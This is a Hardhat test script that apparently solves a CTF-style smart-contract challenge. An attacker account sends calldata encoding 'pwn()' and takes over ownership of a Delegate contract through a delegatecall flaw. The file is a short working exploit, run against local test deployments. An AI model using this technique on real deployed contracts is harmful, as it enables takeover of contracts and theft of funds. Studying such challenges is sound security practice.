import { TransactionResponse } from "@ethersproject/providers"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { Contract } from "ethers"
// @ts-ignore
import { ethers } from "hardhat"

const CONTRACT_NAME = "Delegate"
const CONTRACT_NAME_ATTACKER = "Delegation"

describe(CONTRACT_NAME, () => {
    let owner: SignerWithAddress
    let attacker: SignerWithAddress
    let delegate: Contract
    let delegation: Contract
    let tx: TransactionResponse

    beforeEach(async () => {
        [ owner, attacker ] = await ethers.getSigners()

        const [ DelegateFactory, DelegationFactory ] = await Promise.all([
            await ethers.getContractFactory(CONTRACT_NAME),
            await ethers.getContractFactory(CONTRACT_NAME_ATTACKER)
        ])

        delegate = await DelegateFactory.deploy(owner.address)
        await delegate.deployed()

        delegation = await DelegationFactory.deploy(delegate.address)
        await delegation.deployed()
    })

    it("Should be possible to claim ownership of the contract", async () => {
        expect(await delegate.owner()).to.eq(owner.address)

        const delegateeAbi = ["function pwn()"]
        const iface = new ethers.utils.Interface(delegateeAbi)
        const data = iface.encodeFunctionData("pwn")

        tx = await attacker.sendTransaction({
            to: delegate.address,
            data: data,
            gasLimit: 100000
        })
        await tx.wait()

        expect(await delegate.owner()).to.eq(attacker.address)
    })
})